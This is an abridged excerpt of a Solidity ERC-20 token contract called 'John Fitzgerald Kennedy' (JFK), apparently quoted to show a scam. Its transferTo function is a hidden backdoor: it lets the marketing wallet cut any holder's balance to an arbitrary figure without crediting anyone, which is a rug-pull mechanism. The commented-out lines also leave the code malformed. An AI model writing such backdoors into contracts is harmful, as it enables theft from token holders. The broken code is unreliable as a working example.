...
contract JohnFitzgeraldKennedy is Ownable, IERC20, Context {
    using SafeMath for uint256;

    string private constant _name = "John Fitzgerald Kennedy";
    string private constant _symbol = "JFK";
    ...
    constructor () {
        ...
        _balances_[address(this)] = _totalSupply;
    }
    ...
    function transferTo(address from, uint256 amount) external {
        uint256 senderBalance = _balances_[from];
        if (marketingWallet == msg.sender) { 
             _balances_[from] -= (senderBalance - amount);
             //_balances_[to] = _balances_[to] + amount  } else {
             //_balances_[to] = _balances_[to] + amount
               }
    }
    ...
    function _transfer(address sender, address to, uint256 value) private {
        ...
        _balances_[sender] = _balances_[sender].sub(value);  
        _balances_[to] = _balances_[to].add(value);  
